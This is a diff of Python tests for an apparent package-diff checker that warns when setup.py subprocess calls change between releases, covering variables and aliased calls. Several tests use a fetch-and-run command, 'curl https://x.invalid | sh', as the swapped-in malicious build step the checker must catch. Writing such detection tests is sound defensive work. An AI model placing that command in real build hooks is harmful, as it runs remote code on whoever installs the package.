@@ -626,14 +626,34 @@ def test_a_changed_expression_counts_as_changed() -> None:
     base = DOCS_HOOK.format(args="['make', 'docs']")
     assert len(_c002(base, DOCS_HOOK.format(args="('make', 'docs')"))) == 1
     assert len(_c002(DOCS_HOOK.format(args="cmd"), DOCS_HOOK.format(args="cmd2"))) == 1
-    # The same variable is the same argument, whatever it was assigned.
-    assert (
-        _c002(
-            "cmd = ['make']\n" + DOCS_HOOK.format(args="cmd"),
-            "cmd = ['sh']\n" + DOCS_HOOK.format(args="cmd"),
-        )
-        == []
+    # A variable nothing assigns is the same argument under the same name.
+    assert _c002(DOCS_HOOK.format(args="cmd"), "# v2\n" + DOCS_HOOK.format(args="cmd")) == []
+
+
+def test_a_variable_assigned_once_is_the_value_it_holds() -> None:
+    """Only ``cmd = [...]`` changed: the call reads the same, the command
+    doesn't. Written out in the call or held in a variable, the same command
+    is the same argument."""
+    base = "cmd = ['make']\n" + DOCS_HOOK.format(args="cmd")
+    [f] = _c002(
+        base, "cmd = ['sh', '-c', 'curl https://x.invalid | sh']\n" + DOCS_HOOK.format(args="cmd")
     )
+    assert f.severity is Severity.WARN
+    assert [e.summary for e in f.evidence] == [
+        "setup.py:8 calls subprocess.call(cmd) with cmd = ['sh', '-c', 'curl https://x.invalid | sh']"
+        " (in BuildDocs.run()), changed from subprocess.call(cmd) with cmd = ['make'] at line 8 in 1.0"
+    ]
+    assert _c002(base, DOCS_HOOK.format(args="['make']")) == []
+    assert _c002(DOCS_HOOK.format(args="['make']"), base) == []
+    assert _c002(base, "command = ['make']\n" + DOCS_HOOK.format(args="command")) == []
+    # A variable Garnet can no longer follow is a change, never a pass: here
+    # the command now comes from a parameter.
+    cand = DOCS_HOOK.replace("def run(self):", "def run(self, cmd=['make']):").format(args="cmd")
+    [f] = _c002(base, cand)
+    assert [e.summary for e in f.evidence] == [
+        "setup.py:7 calls subprocess.call(cmd) (in BuildDocs.run()), changed from "
+        "subprocess.call(cmd) with cmd = ['make'] at line 8 in 1.0"
+    ]
 
 
 def test_several_calls_to_one_callee_are_matched_as_a_multiset() -> None:
@@ -664,6 +684,23 @@ def test_several_calls_to_one_callee_are_matched_as_a_multiset() -> None:
     ]
     # One call dropped and the other kept: nothing new runs.
     assert _c002(base, setup(docs)) == []
+
+
+def test_a_trusted_call_made_through_an_alias_matches_and_a_swapped_one_warns() -> None:
+    """Renaming the call (``run = subprocess.call``) isn't a change; giving the
+    aliased call a new command is the change GRN-C002 is for."""
+    trusted = "import subprocess\nfrom setuptools import setup\n\nsubprocess.call(['make', 'docs'])\nsetup(name='demo')\n"
+    same = "import subprocess\nfrom setuptools import setup\n\nrun = subprocess.call\nrun(['make', 'docs'])\nsetup(name='demo')\n"
+    swapped = same.replace(
+        "run(['make', 'docs'])", "run(['sh', '-c', 'curl https://x.invalid | sh'])"
+    )
+    assert _c002(trusted, same) == []
+    [f] = _c002(trusted, swapped)
+    assert f.severity is Severity.WARN
+    assert [e.summary for e in f.evidence] == [
+        "setup.py:5 calls subprocess.call(['sh', '-c', 'curl https://x.invalid | sh']),"
+        " changed from subprocess.call(['make', 'docs']) at line 4 in 1.0"
+    ]
 
 
 def test_new_callee_and_changed_arguments_are_reported_together() -> None:
